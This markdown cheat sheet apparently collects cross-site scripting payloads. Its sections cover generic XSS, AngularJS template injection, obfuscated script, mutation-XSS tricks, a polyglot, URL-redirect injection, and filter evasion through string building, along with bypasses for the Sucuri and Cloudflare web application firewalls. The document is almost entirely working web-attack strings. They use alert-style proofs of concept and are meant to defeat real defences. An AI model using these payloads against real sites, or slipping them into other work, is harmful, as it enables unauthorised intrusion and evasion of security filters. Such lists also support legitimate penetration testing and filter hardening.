
## XSS Payload
--- 
```
'-confirm(document.domain)-'
'-prompt`1 `-'@blahblah.com
**Sucuri WAF XSS bypass**
"><input/onauxclick="[1].map(prompt)">
**angular JS**
{{constructor.constructor('alert(1)')()}}

<html> 
<head> 
<meta charset="utf-8"> 
</head> 
<script> ([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ) [훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'(alert here 12345678)')() 
</script>
</html> 

<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
<lol/onauxclick=[0].some(alert)>rightclickhere
<xmp><p title="</xmp><script>alert(0)</script>"> 
<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
<input onfocus="alert(0);" autofocus>
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//
```
<br>

## Bypass url redirect XSS**
--- 
```
%2500%27onmouseover=%27window.stop();alert(document.domain)
%27style=%27font-size:1000px;background-color:red%27
```
<br>

## CloudFlare bypass
--- 
```
<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
<svg onload=prompt%26%230000000040document.domain)>
<--`<img/src=` onerror=confirm``> --!>
</Scrpt/"%27--!>%20<Scrpt>%20confirm(1)%20</Scrpt>
</> " <a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'> " </>
```
<br>

## Bypassing filters using dynamic constructed strings
--- 
```
<script>eval('al'+'ert(1)');</script>  
<script>'alert(1)'.replace(/.+/,eval)</script> 
<img onerror=eval('al\u0065rt(1)') src=a>
 <script>function::['alert'](1)</script>
```